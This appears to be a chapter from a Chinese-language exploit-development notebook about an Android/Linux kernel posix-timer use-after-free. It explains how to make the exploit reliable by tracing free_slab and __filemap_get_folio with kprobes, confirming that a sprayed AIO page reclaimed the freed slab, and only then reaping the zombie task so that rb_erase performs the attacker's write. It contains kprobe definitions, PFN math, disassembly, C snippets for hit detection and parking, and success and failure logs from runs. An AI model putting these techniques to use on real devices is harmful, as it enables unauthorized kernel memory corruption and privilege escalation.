# 08 · EXACT HIT：先确认命中，再动手

> 这一章讲的是「为什么我们之前一直崩」，以及正确的做法。
> **如果你只学一个技巧，学这个。**

---

## 一、我们之前的错误做法

```
建 timer → 等僵尸 → 喷射 234MB → ★ 直接 reap ★
                                    │
                                    ▼
                        内核 timerqueue_del → rb_erase
```

**reap 是不可逆的。**

- 如果喷中了目标页 → `rb_erase` 读到我们的 payload → 写成功 ✅
- 如果没喷中 → `rb_erase` 读到页里的垃圾 → 当成 `rb_node` 解引用 → **panic** ❌

**所以之前一直在用「约 50% 的崩溃率」赌一次命中。**

---

## 二、正确的做法（popsicle 那份实现的原话）

> 实现先把定时器对象放入可跟踪的 slab，并等待目标任务进入可控制的 zombie 状态。
> 源码观测 **RCU 回调**和 **`free_slab`**，确认释放事件属于**同一个目标 slab**，
> 再尝试用可映射的内核页重新占用目标页。
> **只有映射确实覆盖到先前记录的目标节点时，才允许回收 zombie**，
> 由内核的树清理路径完成预期写入。
>
> 这里的关键**不是增加盲目分配量**，而是把
> 「目标对象地址 → slab → 物理页 → 新映射 → 最终写入」串成同一条证据链。
> 日志中的 **`EXACT HIT`**、目标 PFN 和节点偏移用于解释一次尝试为何可以继续。
> **缺少精确命中时，程序会输出 `PARKED` 并保留危险状态**；
> 在同一次开机中直接回收或强行重试可能导致内核崩溃。

**核心思想：把不可逆动作推迟到有证据之后。**

---

## 三、三种「命中判据」

### 3.1 方法 A：PFN 比对（popsicle 用的）

```
① kprobe free_slab 拿到被释放 slab 的 struct page*
   "p:grp/ev free_slab cache=%x0:x64 slab=%x1:x64"

② 换算成 PFN
   target_pfn = (wanted_slab - TARGET_VMEMMAP_START) / 0x40 + MEMSTART_PFN

③ 从 AIO 页的 folio 拿到我们自己的 PFN
   "r:grp/folio __filemap_get_folio folio=$retval:x64"

④ 比对
   if (our_pfn == target_pfn) → EXACT HIT
```

### 3.2 ★ 方法 B：**直接比指针**（我们的简化版，更干净）

**关键洞察**：

- `free_slab(x0 = struct kmem_cache *s, x1 = struct slab *slab)`
- `__filemap_get_folio(...)` 返回值是 `struct folio *`
- 在 6.6 里，`struct slab *` 和 `struct folio *` **都是 `struct page *` 的别名**

**所以可以直接比指针，完全不需要 vmemmap / page_offset 换算：**

```c
命中条件:
    folio == slab          /* 我们拿到了 8KB slab 的前 4KB */
或  folio == slab + 64     /* 后 4KB（sizeof(struct page) = 64）*/
```

**哪一半由 `victim & 0x1fff >= 4096` 决定。**

**这比原版少三个可能算错的常量。**

#### 参数顺序怎么确认的

反汇编 `free_slab`：

```asm
0xffffffc080383240  paciasp
0xffffffc08038325c  ldrb  w8, [x0, #0xa]     ← 读 s->flags，确认 x0 = kmem_cache
0xffffffc080383280  add   x0, x1, #0x10      ← 用 slab+0x10，确认 x1 = slab
```

**⇒ 格式串 `free_slab cache=%x0:x64 slab=%x1:x64` 正确。**

### 3.3 方法 C：Shark 的 `burst hit`（实际成功的那个）

Shark 用的是第三种做法，日志里的表现是：

```
[+] plant1 free_seen=1 burst hit=1 after 48ms
```

- `free_seen` — 是否观测到目标 slab 的释放
- `burst hit` — 在释放之后的一小段时间窗口里，我们的分配是否「命中」
- **只有 `hit=1` 才继续 reap**

失败的日志：

```
[+] plant1 free_seen=1 burst hit=0 after 3093ms
[-] plant1 burst missed; holding zombie
```

**`holding zombie` —— 把僵尸留着，不 reap，把自己重命名成 holder，等下一次尝试。**

---

## 四、我们可以怎么实现（未完成，供参考）

我们写了工具但没接进主流程（因为 Shark 已经有更好的实现）。

### 4.1 建探针

```c
static void make_probes(void)
{
    write_file("/sys/kernel/tracing/kprobe_events",
        "p:probe98260/free_slab free_slab cache=%x0:x64 slab=%x1:x64\n");
    write_file("/sys/kernel/tracing/kprobe_events",
        "r:probe98260/folio __filemap_get_folio folio=$retval:x64\n");
}
```

### 4.2 读事件

```c
/* 从 /sys/kernel/tracing/trace 里解析 */
static int parse_events(const char *buf, uint64_t *slab, uint64_t *folio)
{
    /* free_slab: ... slab=0xffff... */
    /* folio:     ... folio=0xffff... */
}
```

### 4.3 判命中

```c
uint32_t off_in_slab = victim & 0x1fff;
int want_tail = (off_in_slab >= 4096);

if (slab_out && folio_out) {
    if (!want_tail && *folio_out == *slab_out)
        return 1;                                   /* EXACT HIT 前半 */
    if (want_tail && *folio_out == *slab_out + 64)
        return 1;                                   /* EXACT HIT 后半 */
}
return 0;
```

### 4.4 没命中就 PARKED

```c
if (!exact_hit) {
    log("PARKED");
    /* 保留僵尸，绝不 reap */
    park_forever();
}
```

---

## 五、零风险验证工具

我们写了一个工具，**完全不触发 UAF**，只验证 tracefs 通路：

```console
$ adb push tools/trace_probe.c  # 编译后
$ adb shell /data/local/tmp/trace_probe 512 256
```

它做三件事：

| 步骤 | 验证什么 |
|---|---|
| 往 `kprobe_events` 写两条探针 | kprobe 通路在当前 SELinux 状态下能不能建 |
| 建/销 512 个 posix timer | `free_slab` 能不能抓到我们的 cache |
| 建 256 个 AIO 上下文 | `__filemap_get_folio` 能不能拿到 folio 指针 |

**三种可能的结果对应三条路：**

```
① 探针建不起来        → 换观测手段（比如换成 kmem_cache_free tracepoint）
② 建起来但没抓到事件   → 换挂点
③ 两类事件都抓到了     → ★ 可以接进主流程
```

**这是一个可以在任何阶段安全运行的验证。**

---

## 六、为什么这个思路值钱

| | 盲 reap | EXACT HIT |
|---|---|---|
| 命中时 | 成功 | 成功 |
| 未命中时 | **panic** | **PARKED，不崩** |
| 可重试性 | 崩了就重来整轮 | 同一次开机可以继续 |
| 可观测性 | 只能看「成/崩」 | 日志里有 `free_seen` / `hit` / `PARKED` |

**这就是为什么我们修复 KASLR bug 之后，跑 6 次一次都没崩 —— Shark 的 `PARKED` 机制救了命。**

---

## 七、日志速查

| 日志 | 含义 | 该怎么办 |
|---|---|---|
| `free_seen=1 burst hit=1` | 精确命中 | 继续，会 reap |
| `free_seen=1 burst hit=0` | 释放看到了但没抢到 | `PARKED`，重跑 |
| `free_seen=0` | 没看到释放 | 检查探针 / 触发是否成功 |
| `holding zombie` | 保留僵尸 | 正常，下次可继续 |
| `PARKED=1` | 已 park | 重跑 |
| `FAIL=xxx REASON=xxx` | 失败 | 看 tag 定位是哪一阶段 |
